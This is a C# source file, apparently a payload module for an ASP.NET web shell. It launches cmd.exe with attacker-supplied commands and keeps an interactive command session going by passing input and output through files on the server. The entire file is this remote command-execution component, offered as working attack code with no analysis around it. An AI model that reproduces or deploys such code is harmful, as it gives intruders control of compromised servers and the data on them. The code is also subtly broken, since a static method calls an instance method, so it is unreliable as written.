using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;
using System.Threading;
using System.Diagnostics;

public class Payload
{
    public static string run()
    {
        HttpContext.Current.Server.ScriptTimeout = 3600;
        Directory.SetCurrentDirectory(Globals.pwd);
        return shell();
    }

    string shell()
    {
        Mutex mut = new Mutex(false, "test123");
        Process p = new Process();
        ProcessStartInfo pinfo = p.StartInfo;
        pinfo.RedirectStandardOutput = true;
        pinfo.RedirectStandardInput = true;
        pinfo.UseShellExecute = false;
        pinfo.WorkingDirectory = Globals.pwd;
        pinfo.FileName = "cmd.exe";
        pinfo.Arguments = "/c " + Globals.shell;
        try
        {
            p.Start();
        }
        catch (Exception e)
        {
            return "-2";
        }
        StreamWriter writer = p.StandardInput;
        StreamReader out_reader = p.StandardOutput;
        using (FileStream t1 = File.Create(Globals.infile)) ;
        using (FileStream t2 = File.Create(Globals.outfile)) ;
        Thread read_thread = new Thread(Payload.ReadToFile);
        read_thread.Start(new Tuple<StreamReader, Process>(out_reader, p));
        while (!p.HasExited && File.Exists(Globals.infile) && File.Exists(Globals.outfile))
        {
            String cmd = "";
            mut.WaitOne();
            try{
                cmd = File.ReadAllText(Globals.infile);
                File.WriteAllText(Globals.infile, "");
            }catch(Exception){break;}finally{
                mut.ReleaseMutex();
            }
            if (cmd != "")
            {
                writer.Write(cmd);
                writer.Flush();
            }
            Thread.Sleep(200);
        }
        try
        {
            p.Kill();
        }
        catch (InvalidOperationException)
        {

        }
        p.Close();
        return "1";
    }

    static void ReadToFile(Object obj)
    {
        Tuple<StreamReader, Process> tmp = (Tuple<StreamReader, Process>)obj;
        StreamReader reader = tmp.Item1;
        Process p = tmp.Item2;
        Mutex mut = new Mutex(false, "test123");
        while (!p.HasExited && File.Exists(Globals.infile) && File.Exists(Globals.outfile))
        {
            char[] buf = new char[4096];
            reader.Read(buf, 0, 4096);
            string s = new string(buf);
            s = s.TrimEnd(new char[] { '\x00' });
            if (s != "")
            {
                mut.WaitOne();
                File.AppendAllText(Globals.outfile, s);
                mut.ReleaseMutex();
            }
        }
    }
}